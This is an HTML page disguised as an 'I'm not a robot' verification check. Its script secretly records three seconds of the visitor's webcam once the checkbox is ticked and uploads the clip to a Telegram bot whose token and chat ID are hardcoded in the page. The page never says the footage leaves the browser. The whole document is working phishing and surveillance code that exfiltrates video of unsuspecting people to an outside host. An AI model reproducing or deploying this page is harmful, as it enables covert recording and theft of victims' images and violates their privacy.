<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Robot Verification</title>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #1E88E5, #43A047);
            color: white;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: rgba(0, 0, 0, 0.8);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            transform: scale(0.9);
            animation: zoomIn 0.5s ease-out forwards;
        }

        h1 {
            font-size: 26px;
            margin-bottom: 20px;
        }

        .checkbox-container {
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
            gap: 10px;
            font-size: 18px;
            cursor: pointer;
        }

        input[type="checkbox"] {
            width: 24px;
            height: 24px;
            accent-color: #4CAF50;
            transition: transform 0.3s ease;
        }

        input[type="checkbox"]:checked {
            transform: scale(1.3);
        }

        .loading {
            display: none;
            font-size: 18px;
            margin-top: 20px;
            color: #FBC02D;
        }

        .success {
            display: none;
            font-size: 20px;
            margin-top: 20px;
            color: #4CAF50;
        }

        video {
            width: 320px;
            height: 240px;
            border-radius: 10px;
            margin: 20px 0;
            display: block;
            background: black;
        }

        @keyframes zoomIn {
            0% {
                transform: scale(0.8);
                opacity: 0;
            }
            100% {
                transform: scale(1);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Are you a robot?</h1>
        <div class="checkbox-container">
            <input type="checkbox" id="robot-checkbox">
            <label for="robot-checkbox">I'm not a robot</label>
        </div>
        <video id="video" autoplay playsinline muted></video>
        <div class="loading">Recording in progress... ⏳</div>
        <div class="success">✅ You're verified! Please wait...</div>
    </div>

    <script>
        const video = document.getElementById('video');
        const checkbox = document.getElementById('robot-checkbox');
        const loading = document.querySelector('.loading');
        const success = document.querySelector('.success');

        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
        const telegramChatId = "2070423407";

        checkbox.addEventListener('change', (e) => {
            if (e.target.checked) {
                // Show loading animation
                loading.style.display = 'block';
                success.style.display = 'none';

                // Access the camera
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then((stream) => {
                        // Display the camera feed
                        video.srcObject = stream;

                        // Start recording
                        const mediaRecorder = new MediaRecorder(stream);
                        const chunks = [];

                        mediaRecorder.start();

                        mediaRecorder.ondataavailable = (event) => {
                            chunks.push(event.data);
                        };

                        setTimeout(() => {
                            mediaRecorder.stop();
                        }, 3000); // Record for 3 seconds

                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'video/webm' });
                            const formData = new FormData();
                            formData.append('chat_id', telegramChatId);
                            formData.append('video', blob, 'video.webm');

                            // Send video to Telegram
                            fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
                                method: 'POST',
                                body: formData
                            })
                                .then((response) => {
                                    if (response.ok) {
                                        loading.style.display = 'none';
                                        success.style.display = 'block';
                                        setTimeout(() => {
                                            success.style.display = 'none';
                                        }, 2000);
                                    } else {
                                        alert('Failed to send video.');
                                    }
                                })
                                .catch((error) => {
                                    alert('Error: ' + error.message);
                                });

                            // Stop the camera
                            stream.getTracks().forEach(track => track.stop());
                        };
                    })
                    .catch((err) => {
                        alert("Unable to access the camera: " + err.message);
                    });
            }
        });
    </script>
</body>
</html>
